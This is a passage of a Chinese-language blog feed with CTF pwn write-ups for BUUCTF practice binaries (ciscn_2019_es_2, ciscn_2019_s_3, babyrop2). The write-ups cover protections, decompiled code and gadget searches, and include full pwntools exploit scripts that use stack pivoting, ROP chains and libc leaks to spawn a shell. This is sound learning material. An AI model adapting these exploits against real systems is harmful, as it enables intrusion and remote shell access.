class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(system)+<span class="string">&#x27;aaaa&#x27;</span>+p32(sh)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>以下是最主要的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>记得write的调用参数的使方法吧！</p><p>以下就是参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(1)+p32(write_got)+p32(4)</span><br></pre></td></tr></table></figure><p>总结:<br>很基础的一题</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;jarvisoj-level3&quot;&gt;&lt;a href=&quot;#jarvisoj-level3&quot; class=&quot;headerlink&quot; title=&quot;jarvisoj_level3&quot;&gt;&lt;/a&gt;jarvisoj_level3&lt;/h1&gt;&lt;p&gt;查看保护&lt;/p&gt;
&lt;figure c</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-ciscn_2019_es_2</title>
    <link href="http://example.com/2022/03/12/buuctf-ciscn-2019-es-2/"/>
    <id>http://example.com/2022/03/12/buuctf-ciscn-2019-es-2/</id>
    <published>2022-03-12T15:20:03.000Z</published>
    <updated>2022-03-12T15:20:44.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)//没开</span><br></pre></td></tr></table></figure><p>没什么好说的运行一下</p><p><img src="/2022/03/12/buuctf-ciscn-2019-es-2/image-20220312224457620.png" alt="image-20220312224457620"></p><p>输入过多会打印出一些值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看上面我就知道,只能泄漏出ebp然栈迁移到s里面进行调用getshell!</p><p>利用思路(<code>栈迁移</code>)</p><p>利用第一次输入输出来泄漏出ebp的地址,然后推算出s在栈中的地址,然后第2次来往栈中写入system(/bin/sh),来达到getshell的地步，之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell</p><p>现在开始理清楚思路:</p><h2 id="一-泄漏ebp地址"><a href="#一-泄漏ebp地址" class="headerlink" title="一,泄漏ebp地址"></a>一,泄漏ebp地址</h2><p>printf函数在输出的时候遇到’\0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’\0‘，那样就会将ebp连带着输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p.u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><h2 id="二-找到参数s在栈上的位置"><a href="#二-找到参数s在栈上的位置" class="headerlink" title="二,找到参数s在栈上的位置"></a>二,找到参数s在栈上的位置</h2><p>gdb中printf设置断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *printf</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure><p><img src="/2022/03/12/buuctf-ciscn-2019-es-2/image-20220312225809165.png" alt="image-20220312225809165"></p><p><img src="/2022/03/12/buuctf-ciscn-2019-es-2/image-20220312225854619.png" alt="image-20220312225854619"></p><p>开始计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffcfc8-0xffffcf90=0x38</span><br></pre></td></tr></table></figure><h3 id="三-布置s栈上的值"><a href="#三-布置s栈上的值" class="headerlink" title="三.布置s栈上的值"></a>三.布置s栈上的值</h3><p>由于我们要用到leave;ret来劫持栈，所以先找一下leva;ret的位置(这个好像没有什么要求),</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2=&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+0x10)+&quot;/bin/sh&quot;</span><br><span class="line">aaaa是给栈迁移后ebp留出来的空间,这个计算system_plt的位置,main这个地址是system返回地址随便填,p32(s+0x10)这个位置应该是system的参数，但是程序中并没有现成的，所以只能把&#x27;/bin/sh\x00&#x27;写到后面，然后这里填s的地址加上16的偏移就是参数了，接下来就是把s填充满0x28，再后面的内容就是实现栈迁移了。</span><br><span class="line">payload2=payload2.ljust(0x28,&#x27;\x00&#x27;)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28771</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line">sys=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">main=<span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">s=ebp=u32(r.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-es-2&quot;&gt;&lt;a href=&quot;#ciscn-2019-es-2&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_es_2&quot;&gt;&lt;/a&gt;ciscn_2019_es_2&lt;/h1&gt;&lt;figure class=&quot;highli</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-ciscn_2019_s_3</title>
    <link href="http://example.com/2022/03/12/buuctf-ciscn-2019-s-3/"/>
    <id>http://example.com/2022/03/12/buuctf-ciscn-2019-s-3/</id>
    <published>2022-03-12T14:10:37.000Z</published>
    <updated>2022-03-12T14:11:49.065Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>查看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found<span class="comment">//无</span></span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span><span class="comment">//无</span></span></span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaaaaaaaaaaaaa</span><br><span class="line">aaaaaaaaaaaaaaaaaaaa</span><br><span class="line">6@�̛��zsh: segmentation fault  ./ciscn_s_3</span><br></pre></td></tr></table></figure><p>我当时预测是栈迁移的题目或者又是printf泄漏的题目，直到看了ida中syscall这个东西,我觉得有必要科普一下系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; syscall; LINUX - sys_read &#125;</span><br><span class="line">  result = <span class="number">1LL</span>;</span><br><span class="line">  __asm &#123; syscall; LINUX - sys_write &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用:"></a>系统调用:</h3><p><strong>系统调用（Syscall）</strong> 是一种软中断处理程序，用于让程序从用户态陷入内核态，以执行相应的操作。</p><h4 id="系统调用的作用"><a href="#系统调用的作用" class="headerlink" title="系统调用的作用"></a>系统调用的作用</h4><p>当发生系统调用时，会让程序从用户态陷入内核态，以执行相应的操作</p><p>理解完了,下面开始操作,这个时候就得去理解汇编了,因为实在不知道怎么领悟,遇事不决看汇编!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004004</span>ED ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004004</span>ED                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004004</span>EE                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004004F</span>1                 <span class="keyword">xor</span>     rax, rax</span><br><span class="line">.text:<span class="number">00000000004004F</span>4                 mov     edx, <span class="number">400</span>h       ; count</span><br><span class="line">.text:<span class="number">00000000004004F</span>9                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:<span class="number">00000000004004F</span>E                 mov     rdi, rax        ; fd</span><br><span class="line">.text:<span class="number">0000000000400501</span>                 syscall                 ; LINUX - sys_read<span class="comment">//系统调用read</span></span><br><span class="line">.text:<span class="number">0000000000400503</span>                 mov     rax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">000000000040050</span>A                 mov     edx, <span class="number">30</span>h        ; count</span><br><span class="line">.text:<span class="number">000000000040050F</span>                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:<span class="number">0000000000400514</span>                 mov     rdi, rax        ; fd</span><br><span class="line">.text:<span class="number">0000000000400517</span>                 syscall                 ; LINUX - sys_write <span class="comment">//系统调用write</span></span><br><span class="line">.text:<span class="number">0000000000400519</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400519</span> vuln            endp ; sp-analysis failed</span><br><span class="line">.text:<span class="number">0000000000400519</span></span><br><span class="line">.text:<span class="number">0000000000400519</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040051</span>A                 db <span class="number">90</span>h</span><br><span class="line">.text:<span class="number">000000000040051B</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">000000000040051B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040051</span>C                 retn</span><br></pre></td></tr></table></figure><p>我们得依靠read的参数来猜测是怎么的因为是64位的传参为前</p><p><code>read函数</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssize_t read(int fd, void * buf, size_t count);</span><br></pre></td></tr></table></figure><p>write函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int write(int fd,void *buf,int count);</span><br></pre></td></tr></table></figure><p>没错就是这样传参的</p><h3 id="gadget函数"><a href="#gadget函数" class="headerlink" title="gadget函数"></a>gadget函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004004</span>D6 gadgets         proc near</span><br><span class="line">.text:<span class="number">00000000004004</span>D6 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004004</span>D6                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004004</span>D7                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004004</span>DA                 mov     rax, <span class="number">0F</span>h</span><br><span class="line">.text:<span class="number">00000000004004E1</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004004E1</span> gadgets         endp ; sp-analysis failed</span><br><span class="line">.text:<span class="number">00000000004004E1</span></span><br><span class="line">.text:<span class="number">00000000004004E2</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004004E2</span>                 mov     rax, <span class="number">3B</span>h</span><br><span class="line">.text:<span class="number">00000000004004E9</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004004E9</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004004</span>EA                 db <span class="number">90</span>h</span><br><span class="line">.text:<span class="number">00000000004004</span>EB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004004</span>EB                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000004004</span>EC                 retn</span><br><span class="line">.text:<span class="number">00000000004004</span>EC ; &#125; <span class="comment">// starts at 4004D6</span></span><br></pre></td></tr></table></figure><p>这两个gadget控制了rax的值，看看这两个是什么系统调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, 0Fh</span><br><span class="line">mov     rax, 3Bh</span><br></pre></td></tr></table></figure><p>15 sys_rt_sigreturn    //不太熟</p><p> 59 sys_execve        //这个我熟execve(“/bin/sh”,0,0)</p><p>那我们使用execve这种我比较熟悉，因为是系统调用</p><p>所以我们要想构造execve(‘/bin/sh’,0,0)需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将  sys_execve 的调用号 59 赋值给 rax</span><br><span class="line">将    第一个参数即字符串 &quot;/bin/sh&quot;的地址 赋值给 rdi</span><br><span class="line">将    第二个参数 0  赋值给 rsi</span><br><span class="line">将    第三个参数 0  赋值给 rdx</span><br></pre></td></tr></table></figure><p>但我们发现 我们没有 足够gadget 可以利用，于是我想到了</p><p>x64 下的 __libc_csu_init 中的 gadgets，这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在“</p><p>用下面这个命令去 找到它的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ciscn_s_3 --only &#x27;pop|ret&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/buuctf-ciscn-2019-s-3/image-20220311225846555.png" alt="image-20220311225846555"></p><p>有时候显示不全要自己,去自己找!</p><p><img src="../images/buuctf-ciscn-2019-s-3/image-20220311230006714.png" alt="image-20220311230006714"></p><p>这时候就简单了，但是程序上没有/bin/sh那怎么办只能在自己输入,输入到栈里面后,所以我们要将/bin/sh所在的栈地址泄漏出来!但是我在buf发现他输入到0x20之后输出的下一个值是地址(0x00007fffffffdf08)那我们是不是可以算出他偏移的值！</p><p><img src="../images/buuctf-ciscn-2019-s-3/image-20220311233526586.png" alt="image-20220311233526586"></p><p>如我们将公式写出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00007fffffffdf08</span>-<span class="number">0x7fffffffdde0</span>=<span class="number">296</span></span><br><span class="line">buf开始地址栈<span class="number">0x28</span>的位置</span><br></pre></td></tr></table></figure><p>如果我们想要构造execve(“/bin/sh”,0,0)需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将  sys_execve 的调用号 59 赋值给 rax</span><br><span class="line">将    第一个参数即字符串 &quot;/bin/sh&quot;的地址 赋值给 rdi</span><br><span class="line">将    第二个参数 0  赋值给 rsi</span><br><span class="line">将    第三个参数 0  赋值给 rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">main=<span class="number">0x0004004ED</span>//main函数</span><br><span class="line">execv=<span class="number">0x04004E2</span>//ida中调用execv</span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span>//rdi寄存器</span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span>// gadgets</span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span>  //__libc_csu_init_addr</span><br><span class="line">sys=<span class="number">0x00400517</span>//syscall</span><br><span class="line">pl1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(main)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recv(<span class="number">0x20</span>)</span><br><span class="line">sh=u64(io.recv(<span class="number">8</span>))-<span class="number">296</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">pl2=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pl2+=p64(mov_rdxr13_call)+p64(execv)</span><br><span class="line">pl2+=p64(pop_rdi)+p64(sh)+p64(sys)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>总结:</p><p>没领悟全！改天清算的时候来!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-s-3&quot;&gt;&lt;a href=&quot;#ciscn-2019-s-3&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_s_3&quot;&gt;&lt;/a&gt;ciscn_2019_s_3&lt;/h1&gt;&lt;p&gt;查看保护&lt;/p&gt;
&lt;figure class</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-babyrop2</title>
    <link href="http://example.com/2022/03/10/buuctf-babyrop2/"/>
    <id>http://example.com/2022/03/10/buuctf-babyrop2/</id>
    <published>2022-03-10T14:32:34.000Z</published>
    <updated>2022-03-10T14:36:16.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="babyrop2"><a href="#babyrop2" class="headerlink" title="babyrop2"></a>babyrop2</h1><p>先查看保护:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)//没开</span><br></pre></td></tr></table></figure><p>然后运行了一下,发现只有一次输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./babyrop2 </span><br><span class="line">What&#x27;s your name? aaaa</span><br><span class="line">Welcome to the Pwn World again, aaaa!</span><br></pre></td></tr></table></figure><p>然后进ida中查看伪代码,中有溢出到0x28</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  char buf[28]; // [rsp+0h] [rbp-20h]</span><br><span class="line">  int v6; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  printf(&quot;What&#x27;s your name? &quot;, 0LL);</span><br><span class="line">  v3 = read(0, buf, 0x100uLL);//溢出点</span><br><span class="line">  v6 = v3;</span><br><span class="line">  buf[v3 - 1] = 0;</span><br><span class="line">  printf(&quot;Welcome to the Pwn World again, %s!\n&quot;, buf);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用的思路:</p><p>buf的大小为0x20，但是读入的时候读入的是0x100,会造成溢出,我们要想办法覆盖返回地址为system(‘/bin/sh’),那这样在执行的时候便程序调用我们布置好的栈,从而得到shell,但是程序中没有现成的system(/bin/sh，这需要我们自己去构造,这边可以利用read函数,去泄漏程序的libc基址,然后去获得system和/bin/sh字符串的地址然后造成溢出,将返回地址覆盖为system(‘/bin/sh’)</p><p>这一题他是用printf的泄漏libc基址,我个人感觉就是这样泄漏libc,就一次输入泄漏地址是我没刷过的题目!</p><h4 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h4><p>由于是64位的程序,传参的时候需要用到寄存器</p><p>printf函数的原型<code>int printf( const char* format , [argument] ... );</code></p><p> 举个例子–&gt;print(’%s’,‘hello world’)</p><p>使用如下命令查看寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary babyrop2 --only &#x27;pop|ret&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ ROPgadget --binary babyrop2 --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400730 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400732 : pop r15 ; ret</span><br><span class="line">0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004005a0 : pop rbp ; ret</span><br><span class="line">0x0000000000400733 : pop rdi ; ret</span><br><span class="line">0x0000000000400731 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004d1 : ret</span><br><span class="line">0x0000000000400532 : ret 0x200a</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure><p>下面我来依靠exp来讲述思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node3.buuoj.cn&#x27;,28602)</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi=<span 